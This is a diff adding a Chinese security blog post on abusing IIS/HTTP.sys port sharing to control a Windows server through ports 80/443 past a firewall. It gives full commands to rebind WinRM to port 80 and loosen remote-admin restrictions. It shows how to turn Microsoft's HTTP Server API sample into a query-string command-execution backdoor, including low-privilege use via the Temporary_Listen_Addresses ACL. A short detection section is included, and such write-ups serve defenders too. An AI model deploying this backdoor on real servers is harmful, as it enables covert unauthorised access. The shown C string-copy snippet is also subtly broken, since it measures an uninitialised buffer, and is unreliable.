@@ -1,0 +1,544 @@
+<article class="post">
+  <h1>利用IIS的端口共享功能绕过防火墙</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>我最近在思考这样一个问题：</p>
+
+<p>Windows服务器开启了IIS服务，防火墙仅允许80或443端口进行通信，那么如何在不使用webshell的前提下，实现对该服务器的远程管理？更进一步，如果只有低权限，有没有办法呢？</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>HTTP.sys和端口共享</li>
+  <li>WinRM服务</li>
+  <li>HTTP Server API</li>
+  <li>针对80和443端口的利用方法</li>
+  <li>针对高权限和低权限的利用方法</li>
+  <li>检测方法</li>
+</ul>
+
+<h2 id="0x02-基本概念">0x02 基本概念</h2>
+<hr>
+
+<h3 id="1httpsys和端口共享">1.HTTP.sys和端口共享</h3>
+
+<p>微软在Windows 2003 Server加入了内核驱动程序(Http.sys)，用于侦听http流量并根据URL进行处理，允许任意用户进程共享专用于HTTP流量的TCP端口</p>
+
+<p>也就是说，通过HTTP.sys，多个进程将能够侦听同一端口上的HTTP流量</p>
+
+<p>可以使用Netsh命令来查询和配置HTTP.sys设置和参数，参考资料如下：</p>
+
+<p>https://docs.microsoft.com/en-us/windows/win32/http/netsh-commands-for-http</p>
+
+<p>列出所有URL的DACL，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http show urlacl
+</code></pre></div></div>
+
+<p>系统默认包括10个DACL，其中的两个对应WinRM服务，具体信息如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Reserved URL            : http://+:5985/wsman/
+        User: NT SERVICE\WinRM
+            Listen: Yes
+            Delegate: No
+        User: NT SERVICE\Wecsvc
+            Listen: Yes
+            Delegate: No
+            SDDL: D:(A;;GX;;;S-1-5-80-569256582-2953403351-2909559716-1301513147
+-412116970)(A;;GX;;;S-1-5-80-4059739203-877974739-1245631912-527174227-299656351
+7)
+
+    Reserved URL            : https://+:5986/wsman/
+        User: NT SERVICE\WinRM
+            Listen: Yes
+            Delegate: No
+        User: NT SERVICE\Wecsvc
+            Listen: Yes
+            Delegate: No
+            SDDL: D:(A;;GX;;;S-1-5-80-569256582-2953403351-2909559716-1301513147
+-412116970)(A;;GX;;;S-1-5-80-4059739203-877974739-1245631912-527174227-299656351
+7)
+</code></pre></div></div>
+
+<p>5985对应http的端口，5986对应https的端口</p>
+
+<h3 id="2winrm服务">2.WinRM服务</h3>
+
+<p>学习资料：</p>
+
+<p>https://docs.microsoft.com/en-us/windows/win32/winrm/portal</p>
+
+<p>全称Windows Remote Management，能够实现在远程主机上执行命令</p>
+
+<h3 id="3http-server-api">3.HTTP Server API</h3>
+
+<p>学习资料：</p>
+
+<p>https://docs.microsoft.com/en-us/windows/win32/http/http-api-start-page</p>
+
+<p>HTTP Server API使应用程序能够接收定向到URL的HTTP请求并发送HTTP响应</p>
+
+<h2 id="0x03-利用winrm服务实现端口复用">0x03 利用WinRM服务实现端口复用</h2>
+<hr>
+
+<p><strong>注：</strong></p>
+
+<p>Twi1ight的文章已经介绍了这部分内容，感谢他的分享，地址如下：</p>
+
+<p>https://paper.seebug.org/1004/</p>
+
+<p>本节仅对此文章中的内容进行归纳整理并稍作补充</p>
+
+<p>Windows Server 2008默认关闭WinRM服务，Windows Server 2012默认开启</p>
+
+<p><strong>注：</strong></p>
+
+<p>以下操作需要获得管理员权限</p>
+
+<h3 id="1如果系统已开启winrm服务">1.如果系统已开启WinRM服务</h3>
+
+<h4 id="1查看监听配置">(1)查看监听配置</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm e winrm/config/listener
+</code></pre></div></div>
+
+<p>默认监听5985端口，为了不修改默认配置，这里需要新增80端口</p>
+
+<p><strong>注：</strong></p>
+
+<p>查看WinRM配置的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm get winrm/config
+</code></pre></div></div>
+
+<h4 id="2新增80端口">(2)新增80端口</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}
+</code></pre></div></div>
+
+<p>补充：</p>
+
+<p>删除80端口的命令如下:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/service @{EnableCompatibilityHttpListener="false"}
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>如果未新增80端口，远程连接需要指定5985端口，示例如下:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrs -r:http://192.168.112.129:5985 -u:test -p:1234 "whoami"
+</code></pre></div></div>
+
+<h4 id="3允许administrators组中的所有帐户访问该服务">(3)允许Administrators组中的所有帐户访问该服务</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>如果不设置此项，远程连接时只能使用内置管理员帐户Administrator</p>
+
+<h3 id="2如果系统未开启winrm服务">2.如果系统未开启WinRM服务</h3>
+
+<h4 id="1使用默认配置开启并配置服务">(1)使用默认配置开启并配置服务</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Winrm quickconfig -q
+</code></pre></div></div>
+
+<p>将自动执行以下操作：</p>
+
+<ul>
+  <li>启动WinRM服务，并将服务启动类型设置为自动启动</li>
+  <li>添加监听配置</li>
+  <li>添加防火墙规则</li>
+</ul>
+
+<h4 id="2修改默认端口">(2)修改默认端口</h4>
+
+<p>开启服务后，默认监听5985端口，为了更隐蔽，这里需要将默认端口5985修改为80端口</p>
+
+<p>修改http默认端口为80：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>还原http默认端口为5985的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="5985"}
+</code></pre></div></div>
+
+<h4 id="3允许administrators组中的所有帐户访问该服务-1">(3)允许Administrators组中的所有帐户访问该服务</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>如果不设置此项，远程连接时只能使用内置管理员帐户Administrator</p>
+
+<h3 id="3通过winrm服务连接远程主机">3.通过WinRM服务连接远程主机</h3>
+
+<p>本地系统需要使用同远程主机相同的语言环境</p>
+
+<h4 id="1本地系统开启winrm服务">(1)本地系统开启WinRM服务</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Winrm quickconfig -q
+</code></pre></div></div>
+
+<h4 id="2本地系统设置访问规则允许连接所有主机">(2)本地系统设置访问规则，允许连接所有主机</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/Client @{TrustedHosts="*"}
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>删除该访问规则的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm set winrm/config/Client @{TrustedHosts=""}
+</code></pre></div></div>
+
+<h4 id="3连接远程主机的命令示例">(3)连接远程主机的命令示例</h4>
+
+<p>如果为默认5985端口，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrs -r:http://192.168.112.129:5985 -u:administrator -p:1234 "whoami"
+</code></pre></div></div>
+
+<p>如果为80端口，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrs -r:http://192.168.112.129 -u:administrator -p:1234 "whoami"
+</code></pre></div></div>
+
+<h2 id="0x04-利用http-server-api实现端口复用">0x04 利用HTTP Server API实现端口复用</h2>
+<hr>
+
+<h3 id="1示例代码测试">1.示例代码测试</h3>
+
+<p>下载地址：</p>
+
+<p>https://docs.microsoft.com/en-us/windows/win32/http/http-server-sample-application</p>
+
+<p>代码支持同时注册多个URL，处理请求，发送HTTP响应</p>
+
+<p>简单测试如下：</p>
+
+<p>服务器IP为192.168.112.129</p>
+
+<p>管理员权限执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http-server-sample-application.exe http://+:80/MyUri1 http://+:80/MyUri2
+</code></pre></div></div>
+
+<p>打开浏览器分别访问http://192.168.112.129:80/MyUri1和http://192.168.112.129:80/MyUri2</p>
+
+<p>接收的结果如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-6/3-1.png" alt="Alt text"></p>
+
+<p>示例代码通过API HttpAddUrl()将URL注册为Listen On，默认配置下，需要管理员权限才能添加成功，否则产生错误：HttpAddUrl failed with 5，提示权限不够</p>
+
+<p>但可以通过添加url acl(需要管理员权限)的方式实现普通用户权限下的正常运行</p>
+
+<h3 id="2通过添加url-acl需要管理员权限的方式实现示例代码以普通用户权限运行">2.通过添加url acl(需要管理员权限)的方式实现示例代码以普通用户权限运行</h3>
+
+<p>方法如下:</p>
+
+<p>添加url acl，授予Everyone用户对指定URL的权限，命令如下(管理员权限):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http add urlacl url=http://+:80/MyUri user=everyone
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>删除该url acl的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http delete urlacl url=http://+:80/MyUri
+</code></pre></div></div>
+
+<p>再次执行测试程序(普通用户权限)，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http-server-sample-application.exe http://+:80/MyUri
+</code></pre></div></div>
+
+<p>执行成功</p>
+
+<h3 id="3借助已有的url-acl实现示例代码以普通用户权限运行">3.借助已有的url acl实现示例代码以普通用户权限运行</h3>
+
+<p>列出所有URL的DACL，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http show urlacl
+</code></pre></div></div>
+
+<p>注意到默认配置下包含以下acl：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Reserved URL            : http://+:80/Temporary_Listen_Addresses/
+       User: \Everyone
+           Listen: Yes
+           Delegate: No
+           SDDL: D:(A;;GX;;;WD)
+</code></pre></div></div>
+
+<p>User为Everyone，所以我们可以借助这个url</p>
+
+<p>执行示例程序(普通用户权限)，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http-server-sample-application.exe http://+:80/Temporary_Listen_Addresses/MyUri
+</code></pre></div></div>
+
+<p>执行成功</p>
+
+<h3 id="4修改示例代码实现命令执行">4.修改示例代码，实现命令执行</h3>
+
+<p>思路如下：</p>
+
+<p>通过GET请求发送要执行的cmd命令，格式为<code class="language-plaintext highlighter-rouge">?&lt;command&gt;</code></p>
+
+<p>例如:http://192.168.112.129/MyUri?whoami，要执行的命令为whoami，在Response中回复执行的结果</p>
+
+<p>对于不符合格式的GET和POST请求，在Response中回复404</p>
+
+<p>实现代码：</p>
+
+<p>以示例程序为模板，需要修改以下位置：</p>
+
+<h4 id="1使用传入参数">(1)使用?传入参数</h4>
+
+<p><code class="language-plaintext highlighter-rouge">pRequest-&gt;CookedUrl.pQueryString</code>能够读取参数，但包括了无用的字符<code class="language-plaintext highlighter-rouge">?</code>，实际执行命令时需要去掉<code class="language-plaintext highlighter-rouge">pRequest-&gt;CookedUrl.pQueryString</code>的第一个字符</p>
+
+<p>去掉pRequest-&gt;CookedUrl.pQueryString第一个字符的C代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WCHAR *QueryString = new WCHAR[pRequest-&gt;CookedUrl.QueryStringLength-1];
+wcsncpy_s(QueryString, wcslen(QueryString), pRequest-&gt;CookedUrl.pQueryString + 1, wcslen(QueryString) - 1);
+wprintf_s(L"%s\n", QueryString);
+</code></pre></div></div>
+
+<h4 id="2特殊字符的替换">(2)特殊字符的替换</h4>
+
+<ul>
+  <li>空格被转码为%20</li>
+  <li>“被转码为%22</li>
+  <li>‘被转码为%27</li>
+</ul>
+
+<p>例如浏览器输入字符串<code class="language-plaintext highlighter-rouge">whoami /all</code>，会被转码为<code class="language-plaintext highlighter-rouge">whoami%20/all</code>，这条命令无法直接在命令行下执行</p>
+
+<p>还原URL编码的C代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/UrlDecode.cpp</p>
+
+<p>代码支持多字节字符集和Unicode字符集</p>
+
+<h4 id="3使用管道读入命令并执行回传结果">(3)使用管道读入命令并执行，回传结果</h4>
+
+<p>使用管道执行cmd命令并获取结果的代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/UsePipeToExeCmd.cpp</p>
+
+<h4 id="4修改回传结果的格式">(4)修改回传结果的格式</h4>
+
+<p>回传的结果需要作格式转换，<code class="language-plaintext highlighter-rouge">\n</code>换行符转换成html中的<code class="language-plaintext highlighter-rouge">&lt;/br&gt;</code>，否则浏览器显示的内容无法换行</p>
+
+<p>将文本中的换行符(<code class="language-plaintext highlighter-rouge">\n</code>)转换成html中换行符(<code class="language-plaintext highlighter-rouge">&lt;/br&gt;</code>)的代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/TextToHtmlofNewline.cpp</p>
+
+<p>最终实现的代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/HTTPServerWebshell.cpp</p>
+
+<p>只有输入特定格式的url能够执行命令，否则提示404</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-6/2-1.png" alt="Alt text"></p>
+
+<p>命令实例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.112.129/MyUri?net%20start
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-6/2-2.png" alt="Alt text"></p>
+
+<p>https协议也支持，命令实例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://192.168.112.129/MyUri?net%20start
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-6/2-3.png" alt="Alt text"></p>
+
+<h2 id="0x05-利用方法">0x05 利用方法</h2>
+<hr>
+
+<p>Windows服务器开启了IIS服务，防火墙仅允许80或443端口进行通信，在不使用webshell的前提下，实现对该服务器远程管理的方法如下：</p>
+
+<h3 id="1使用管理员权限">1.使用管理员权限</h3>
+
+<h4 id="1使用winrm服务">(1)使用WinRM服务</h4>
+
+<p>需要开启WinRM服务</p>
+
+<p>需要Administrators组中的帐户口令或hash</p>
+
+<h4 id="2使用http-server-api">(2)使用HTTP Server API</h4>
+
+<p>可以使用任意url</p>
+
+<p><strong>注：</strong></p>
+
+<p>80和443端口都可以</p>
+
+<h3 id="2使用普通用户权限">2.使用普通用户权限</h3>
+
+<h4 id="1使用http-server-api">(1)使用HTTP Server API</h4>
+
+<p>使用已有的url acl：http://+:80/Temporary_Listen_Addresses/</p>
+
+<p><strong>注：</strong></p>
+
+<p>无法使用443端口</p>
+
+<h2 id="0x06-检测方法">0x06 检测方法</h2>
+<hr>
+
+<p>使用以下方法检测当前IIS服务器的端口共享功能是否被滥用</p>
+
+<h3 id="1检测正在使用的url">1.检测正在使用的url</h3>
+
+<p>如果使用了HTTP Server API，程序在运行时会注册url，查看命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http sh ser
+</code></pre></div></div>
+
+<p>可疑结果示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Server session ID: D000000020000174
+    Version: 1.0
+    State: Active
+    Properties:
+        Max bandwidth: 4294967295
+        Timeouts:
+            Entity body timeout (secs): 120
+            Drain entity body timeout (secs): 120
+            Request queue timeout (secs): 120
+            Idle connection timeout (secs): 120
+            Header wait timeout (secs): 120
+            Minimum send rate (bytes/sec): 150
+    URL groups:
+    URL group ID: AC0000004000017C
+        State: Active
+        Request queue name: Request queue is unnamed.
+        Properties:
+            Max bandwidth: inherited
+            Max connections: inherited
+            Timeouts:
+                Timeout values inherited
+            Number of registered URLs: 1
+            Registered URLs:
+                HTTP://192.168.112.129:80:192.168.112.129/MYURI/
+
+Server session ID: D000000020000173
+    Version: 1.0
+    State: Active
+    Properties:
+        Max bandwidth: 4294967295
+        Timeouts:
+            Entity body timeout (secs): 120
+            Drain entity body timeout (secs): 120
+            Request queue timeout (secs): 120
+            Idle connection timeout (secs): 120
+            Header wait timeout (secs): 120
+            Minimum send rate (bytes/sec): 150
+    URL groups:
+    URL group ID: AC0000004000017B
+        State: Active
+        Request queue name: Request queue is unnamed.
+        Properties:
+            Max bandwidth: inherited
+            Max connections: inherited
+            Timeouts:
+                Timeout values inherited
+            Number of registered URLs: 1
+            Registered URLs:
+                HTTPS://192.168.112.129:443:192.168.112.129/MYURI/
+                
+Server session ID: D600000020000077
+    Version: 1.0
+    State: Active
+    Properties:
+        Max bandwidth: 4294967295
+        Timeouts:
+            Entity body timeout (secs): 120
+            Drain entity body timeout (secs): 120
+            Request queue timeout (secs): 120
+            Idle connection timeout (secs): 120
+            Header wait timeout (secs): 120
+            Minimum send rate (bytes/sec): 150
+    URL groups:
+    URL group ID: BF00000040000120
+        State: Active
+        Request queue name: Request queue is unnamed.
+        Properties:
+            Max bandwidth: inherited
+            Max connections: inherited
+            Timeouts:
+                Timeout values inherited
+            Number of registered URLs: 1
+            Registered URLs:
+                HTTP://+:80/TEMPORARY_LISTEN_ADDRESSES/
+</code></pre></div></div>
+
+<h3 id="2查看winrm服务配置">2.查看WinRM服务配置</h3>
+
+<p>如果攻击者获得了管理员权限，WinRM服务配置有可能被滥用</p>
+
+<p>查看监听配置：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm e winrm/config/listener
+</code></pre></div></div>
+
+<p>查看是否开启可疑端口</p>
+
+<h2 id="0x07-小结">0x07 小结</h2>
+<hr>
+
+<p>本文解决了如下问题：</p>
+
+<p>Windows服务器开启了IIS服务，防火墙仅允许80或443端口进行通信，那么如何在不使用webshell，并且只有普通用户权限，实现对该服务器的远程管理？</p>
+
+<p>解决方法:</p>
+
+<p>使用代码：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/HTTPServerWebshell.cpp</p>
+
+<p>使用已有的url acl，命令参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTPServerWebshell.exe http://+:80/Temporary_Listen_Addresses/
+</code></pre></div></div>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on August  6, 2019
+  </div>
+
+  
+</article>
